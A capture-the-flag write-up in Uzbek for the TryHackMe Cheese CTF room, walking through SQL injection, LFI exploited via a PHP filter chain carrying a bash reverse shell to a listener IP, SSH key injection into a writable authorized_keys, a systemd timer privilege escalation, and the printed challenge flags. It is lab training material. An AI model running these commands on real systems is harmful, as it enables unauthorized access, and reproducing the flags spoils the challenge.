# Cheese CTF

Room: https://tryhackme.com/room/cheesectfv10

## Web Hacking

Kirish uchun bizda faqat bitta joy bor. 

http://10.10.90.167/login.php

Bu formada esa SQLinjection zaifligi bor.

Quyidagi payloadlar orqali maqsadga erishamiz.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/SQL-Injection

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/cheesectfv10_1.jpg)

Va panelga olib o'tdi.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/cheesectfv10_2.jpg)

LFIga zaif ko'rinadi. Sinab ko'ramiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/cheesectfv10_3.jpg)

O'xshadi.

Keling endi... PHP filter yordamida LFI zaifligida command bajarishga urinamiz.
Payload Generatsiya qilish uchun tool:

https://github.com/synacktiv/php_filter_chain_generator.git

**Buyruq:**

```
python3 php_filter_chain_generator.py --chain "<?php system(\"bash -c 'bash -i >& /dev/tcp/10.8.24.135/4444 0>&1'\"); ?>"
```

**Tavsif:** Reverse Shell tayyorlayapmiz.

**Natija:**

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/cheesectfv10_4.jpg)

Tayyor bo'lgan payloadni file argumentiga qo'yamiz va tamom.

Natija:

```
mete@sec ~> nc -nvln 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.90.167 41248
bash: cannot set terminal process group (927): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-90-167:/var/www/html$ 
```



## Privilage Escalation

Userlar ro'yxati:

```
www-data@ip-10-10-90-167:/home$ ls
comte  ubuntu
```

Comte userining cat .ssh/authorized_keys fayli **writeable** ekan.

O'zimizni kompyuterimizdan:

1. ssh-keygen orqali key generatsiya qilamiz.
2. .ssh papkasiga kiramiz va .pub faylidagi textn nusxalab olamiz

Serverga:

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5___censored___No+dK2nwDXjgu3YMxhr3DDE mete@sec" >> .ssh/authorized_keys
```

Tayyor endi SSHga ulansak bast!

```
ssh comte@10.10.90.167
```

**user.txt**'ni qo'lga kiritsh:

```
comte@ip-10-10-90-167:~$ cat user.txt
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
```



ROOT huquqlari uchun harakat.

```
nano /etc/systemd/system/exploit.timer
```

Paste:

```
[Unit]
Description=Exploit Timer

[Timer]
OnActiveSec=5s
Unit=exploit.service

[Install]
WantedBy=timers.target

```

```
sudo systemctl daemon-reload
```

```
sudo systemctl start exploit.timer
```

Erishiladigan natija:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/cheesectfv10_6.jpg)

root.txt'ni qo'lga kiritish:

```
/opt/xxd "/root/root.txt" | xxd -r
```

Natija:

```
THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```



# Nafas olar ekanman, men yana davom etaman...
